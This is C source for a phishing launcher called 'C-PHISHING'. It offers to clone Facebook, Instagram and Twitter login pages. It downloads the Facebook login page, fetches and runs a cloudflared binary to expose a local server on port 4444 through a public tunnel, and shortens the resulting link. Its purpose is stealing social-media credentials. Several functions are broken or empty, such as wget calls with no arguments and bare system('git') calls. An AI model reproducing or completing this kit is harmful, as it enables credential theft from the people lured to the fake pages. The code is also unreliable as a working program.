

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

void clear(void);
void cPhish(void);
void delay(unsigned int mytime1);
void fb_download(void);
void instagram_download(void);
void twitter_download(void);
void termux_up(void);
void install_required(void);
void fb_connect(void);
void instagram_connect(void);
void twitter_connect(void);


int main()
{
	unsigned int i, c, n, copied;
	char *s = ".";
	char *S = "\t\tstarting ";
	char *ch = ".....";
	char *buf_fb = "CLONING FACEBOOK ";
	char *buf_instagram = "CLONING INSTAGRAM ";
	char *buf_twitter = "CLONING TWITTER ";
	char *buf_exit = "\t\tEXITING ";
	char *buf_incorrect = "INCORRECT OPTION, ENTER TRY AGAIN! ";
	char *hotspot = "\rPLEASE TURN ON HOTSPOT AND PRESS ENTER : ";
	int ok;

	//clear();
	//termux_up();
	//install_required();
	//delay(50);
	clear();
	cPhish();

	printf("\n");
	printf("\t\tAUTHOR           : PRINCE EKENE NDIOZIRI\n");
	printf("\t\tCOUNTRY          : NIGERIA\n");
	printf("\t\tLINENCE          : GPL\n");
	printf("\t\tWHATSAPP TELL N0 : +234 9132165565\n\n");
	
	write(1, hotspot, strlen(hotspot));
	ok = getchar(); 

	printf("\n\n");

	write(1, S, strlen(S));

	i = 0;
	while(ch[i] != '\0' )
	{

		write(1, s, 2);
		delay(50);
		i = i + 1;
	}

	printf("\n\n\n\n");

start:

	printf("CHOOSE OPTIONS \n\n");

	printf("*********************\n");
	printf("**   0\tFACEBOOK   **\n");
	printf("**                 **\n");
	printf("**   1\tINSTAGRAM  **\n");
	printf("**                 **\n");
	printf("**   2\ttwitter    **\n");
	printf("**                 **\n");
	printf("**   3\texit       **\n");
	printf("*********************\n\n\n");

	printf("ENTER SELECT OPTION (1/3) : ");
	scanf("%d", &n);

	printf("\n\n");

	switch(n)
	{
		case 0:
			write(1, buf_fb, strlen(buf_fb));
			i = 0;
			while(ch[i] != '\0')
			{
				write(1, s, 2 );
				delay(50);
				i = i + 1;
			}
			printf("\n\n");
			fb_download();
			printf("DONE\n\n");
			fb_connect();

			printf("\t\tPLEASE COPY THE URL OF CLOUDFLARE \n");
			printf("\t\tIF COPIED PRESS ENTER : ");
			copied = getchar();
			printf("\n");
			system("shurl");
			break;

		case 1:
			write(1, buf_instagram, strlen(buf_instagram));
			i = 0;
			while(ch[i] != '\0')
			{
				write(1, s, 2);
				delay(50);
				i = i + 1;
			}
			printf("\n\n");
			instagram_download();
			printf("DONE\n\n");
			instagram_connect();

			printf("\t\tPLEASE COPY THE URL OF CLOUDFLARE \n");
                        printf("\t\tIF COPIED PRESS ENTER : ");
                        copied = getchar();                                                                             printf("\n");                                                                                   system("shurl");
			break;

		case 2:
			write(1, buf_twitter, strlen(buf_twitter));
			i = 0;
			while(ch[i] != '\0')
			{
				write(1, s, 2);
				delay(50);
				i = i + 1;
			}
			printf("\n\n");
			twitter_download();
			printf("DONE\n\n");
			twitter_connect();

			printf("\t\tPLEASE COPY THE URL OF CLOUDFLARE \n");
                        printf("\t\tIF COPIED PRESS ENTER : ");
                        copied = getchar();                                                                             printf("\n");                                                                                   system("shurl");
			break;

		case 3:
			write(1, buf_exit, strlen(buf_exit));
			i = 0;
			while(ch[i] != '\0')
			{
				write(1, s, 2);
				delay(50);
				i = i + 1;
			}
			printf("\n\n");
			system("figlet BYE BYE | lolcat");
			exit(0);

		default:
			write(1, buf_incorrect, strlen(buf_incorrect));
			delay(100);
			clear();
			goto start;
	}

	return 0;
}

void delay(unsigned int mytime1)
{
	int i, j;

	for(i = 0; i < mytime1; i++)
		for(j = 0; j < 10000000; j++);
}


void cPhish(void)
{
	system("figlet WELCOME TO C-PHISHING | lolcat");

}

void clear(void)
{
	system("clear");
}

void fb_download(void)
{
	system("wget -i ./facebook.html https://facebook.com/login-page");
	system("wget -i ");
}

void instagram_download(void)
{
	system("wget -i ");
	system("wget h ");
}

void twitter_download(void)
{
	system("wget -i ");
	system("wget -i ");
}

void termux_up(void)
{
	system("apt update");
	system("apt upgrade");
	clear();
}

void install_required(void)
{
	system("git");
	system("wget");
	system("php");
	system("python2");
	system("python3");
	system("ruby");
	system("pip");
	system("pip3");
	system("pip install shurl");
	clear();
	system("figlet Required Module Installed Successfully | lolcat");
}

void fb_connect(void)
{
	clear();
	system("wget https://github.com/cloudflare/cloudflared/releases/download/2022.4.1/cloudflared-linux-arm");
	system("chmod +x cloudflared-linux-arm");
	system("./cloudflared-linux-arm http 4444 ");
	system("./cloudflared-linux-arm tunnel --url ");
}

void instagram_connect(void)
{
        clear();
        system("wget https://github.com/cloudflare/cloudflared/releases/download/2022.4.1/cloudflared-linux-arm");
	system("chmod +x cloudflared-linux-arm");
	system("./cloudflared-linux-arm http 4444 ");
        system("./cloudflared-linux-arm tunnel --url ");
	
}

void twitter_connect(void)
{
        clear();
        system("wget https://github.com/cloudflare/cloudflared/releases/download/2022.4.1/cloudflared-linux-arm");
	system("chmod +x cloudflared-linux-arm");
	system("./cloudflared-linux-arm http 4444 ");
        system("./cloudflared-linux-arm tunnel --url ");
}
